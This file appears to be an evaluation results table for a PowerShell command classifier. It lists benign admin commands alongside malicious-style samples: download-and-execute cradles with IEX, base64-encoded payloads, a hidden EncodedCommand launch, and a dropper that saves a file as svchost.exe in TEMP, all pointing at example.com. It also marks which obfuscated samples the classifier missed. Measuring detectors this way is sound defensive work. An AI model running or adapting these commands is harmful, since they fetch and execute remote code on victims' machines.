label,name,ps,logit_diff,prediction,correct
0,List services,"Get-Service | Sort-Object Status, Name | Select-Object -First 10",-7.609375,ALLOW,True
0,Check disk space,"Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free",-7.0625,ALLOW,True
0,Read local log,Get-Content -Path C:\Windows\Temp\app.log -ErrorAction SilentlyContinue,-6.078125,ALLOW,True
0,Ping host,Test-Connection -ComputerName 8.8.8.8 -Count 2,-7.765625,ALLOW,True
0,List processes,Get-Process | Where-Object {$_.CPU -gt 50},-7.5,ALLOW,True
1,DownloadString + IEX,IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1'),3.1875,BLOCK,True
1,Base64 + IEX,$b='SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdHJpbmcoACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAC4AcABzADEAJwApAA==';IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b))),0.078125,BLOCK,True
1,WebRequest to temp,Invoke-WebRequest -Uri 'http://example.com/a.exe' -OutFile $env:TEMP\svchost.exe; Start-Process $env:TEMP\svchost.exe,0.65625,BLOCK,True
1,EncodedCommand,powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAC4AcABzADEAJwApAA==,-2.78125,ALLOW,False
1,Invoke-Expression hidden,Invoke-Expression -Command $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SQBFAFgAIAcoKG5ldyBvYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9leGFtcGxlLmNvbS9wLnBzMScpKQ=='))),-0.171875,ALLOW,False
